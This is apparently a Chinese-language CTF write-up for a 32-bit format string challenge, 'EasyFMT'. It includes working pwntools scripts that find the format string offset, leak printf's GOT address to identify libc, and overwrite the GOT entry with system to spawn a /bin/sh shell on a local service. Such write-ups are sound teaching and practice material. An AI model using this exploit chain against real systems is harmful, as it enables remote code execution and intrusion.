# EasyFMT

## 文件解析
```shell
file pwn
checksec pwn
```
![](README/BED070C1-1805-486B-A683-FEB522FB7155.png)

![](README/95AB10B4-D5B3-4F4F-8C0E-34CD609EE764.png)

用IDA打开

![](README/87CDF27C-D8E9-403B-90B0-8F0E19783812.png)
结合题目可以看到是一个典型的格式化字符串漏洞

然后标准的输出就是
![](README/6B833CBF-6AF6-43B2-815C-CC39DFE8E358.png)


格式化字符串漏洞，需要首先找到偏移地址

```python
from pwn import *

for i in range(1, 100):
    conn = remote("127.0.0.1", 6080)
    payload = "AAAA%{num}$x".format(num=i)
    conn.recvuntil("repeater?\n")
    conn.sendline(payload)

    data = conn.recv()
    try:
        if "41414141" in data:
            print(i)
            conn.close()
            break

        else:
            conn.close()
    except:
        conn.close()
```

![](README/509ED511-7B09-485C-9470-BD1F0FC55EC0.png)

偏移字数是6

然后利用printf_got的地址来leak printf的实际地址， 而后根据leak到的printf的实际地址来判断目标系统上使用的libc库

获取printf的got地址

![](README/F5E75286-759F-49BD-908F-385D93F48C21.png)

![](README/D439B37F-7541-4D76-8F50-57FB85D57DBC.png)


然后获取printf的实际地址去对比找到libc 的版本
```python
from pwn import *

p=remote("127.0.0.1", 6080)
elf = ELF('./pwn')
puts_got = elf.got['puts']
print hex(puts_got)
payload = p32(puts_got)+'#'+'%6$s'+'#'

p.sendline(payload)
p.recvuntil('#')
puts = u32(p.recvuntil('#')[:4])
print hex(puts)

```


![](README/2E96D63A-36FE-44FF-80C0-33AB7F53AC5C.png)

获取libc版本的方式有两个，一个是项目
https://github.com/niklasb/libc-database
![](README/2DBE607B-4F96-42F3-8E00-C7206EC5AFFB.png)

还有一个是在线的[libc database search](https://libc.blukat.me/?q=printf%3A0x79206f44)

![](README/3E31BCFE-DC44-45ED-A37E-99599B7F3E22.png)


```python
# coding:utf-8
from pwn import *

conn = remote("127.0.0.1", 6080)
elf = ELF("pwn")
libc = ELF("libc.so")

conn.recvuntil("repeater?\n")
printf_got = elf.got["printf"]

payload1 = p32(printf_got)+"%6$s"

conn.sendline(payload1)
data = conn.recvuntil("\n")

printf_addr = u32(data[4:8])

printf_libc = libc.symbols["printf"]
system_libc = libc.symbols["system"]

system_addr = printf_addr - printf_libc + system_libc

payload2 = fmtstr_payload(6, {printf_got:system_addr})
conn.sendline(payload2)
conn.recvuntil("\n")
conn.sendline('/bin/sh\x00')
conn.interactive()

```

![](README/EDDC4DBF-1F7E-4D91-9E1E-A02E22679969.png)

